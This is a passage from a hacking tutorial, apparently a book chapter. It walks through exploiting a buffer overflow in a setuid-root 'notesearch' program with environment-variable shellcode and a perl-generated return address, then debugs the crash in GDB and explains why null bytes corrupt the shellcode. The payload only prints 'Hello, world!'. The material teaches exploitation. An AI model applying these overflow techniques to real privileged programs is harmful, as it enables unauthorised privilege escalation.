Since the notesearch program runs as root, we can't debug it as a normal user
However, we also can't just attach to a running copy of it, because it exits too quickly
Another way to debug programs is with core dumps
From a root prompt, the OS can be told to dump memory when the program crashes by using the command ulimit -c unlimited
This means that dumped core files are allowed to get as big as needed
Now, when the program crashes, the memory will be dumped to disk as a core file, which can be examined using GDB
__________________________________________________________________________________
reader@hacking:~/booksrc $ sudo su
root@hacking:/home/reader/booksrc # ulimit -c unlimited

root@hacking:/home/reader/booksrc # export SHELLCODE=$(cat helloworld1)

root@hacking:/home/reader/booksrc # ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9a3

root@hacking:/home/reader/booksrc # ./notesearch $(perl -e 'print "\xa3\xf9\xff\xbf"x40')
-------[ end of note data ]-------
Segmentation fault (core dumped)

root@hacking:/home/reader/booksrc # ls -l ./core
-rw------- 1 root root 147456 2007-10-26 08:36 ./core

root@hacking:/home/reader/booksrc # gdb -q -c ./core
(no debugging symbols found)
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
Core was generated by `./notesearch
£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E.
Program terminated with signal 11, Segmentation fault.
#0 0x2c6541b7 in ?? ()

(gdb) set dis intel

(gdb) x/5i 0xbffff9a3
0xbffff9a3:     call   0x2c6541b7 
0xbffff9a8:     ins    BYTE PTR es:[edi],[dx] 
0xbffff9a9:     outs   [dx],DWORD PTR ds:[esi] 
0xbffff9aa:     sub    al,0x20 
0xbffff9ac:     ja     0xbffffa1d 

(gdb) i r eip
eip            0x2c6541b7         0x2c6541b7 

(gdb) x/32xb 0xbffff9a3
0xbffff9a3:    0xe8     0x0f   0x48     0x65    0x6c   0x6c    0x6f   0x2c 
0xbffff9ab:    0x20     0x77   0x6f     0x72    0x6c   0x64    0x21   0x0a 
0xbffff9b3:    0x0d     0x59   0xb8     0x04    0xbb   0x01    0xba   0x0f 
0xbffff9bb:    0xcd     0x80   0xb8     0x01    0xbb   0xcd    0x80   0x00 

(gdb) quit

root@hacking:/home/reader/booksrc # hexdump -C helloworld1
00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20  77 6f 72 6c  |.....Hello, worl| 
00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01  00 00 00 ba  |d!..Y...........| 
00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb  00 00 00 00  |................| 
00000030  cd 80                                              |..| 
00000032 
__________________________________________________________________________________

Once GDB is loaded, the disassembly style is switched to Intel
Since we are running GDB as root, the .gdbinit file won't be used
The memory where the shellcode should be is examined
The instructions look incorrect, but it seems like the first incorrect call instruction is what caused the crash
At least, execution was redirected, but something went wrong with the shellcode bytes
Normally, strings are terminated by a null byte, but here, the shell was kind enough to remove these null bytes for us
This, however, totally destroys the meaning of the machine code
Often, shellcode will be injected into a process as a string, using functions like strcpy()
Such functions will simply terminate at the first null byte, producing incomplete and unstable shellcode in memory
In order for the shellcode to survive tarnsit, it must be redesigned so it doesn't contain any null bytes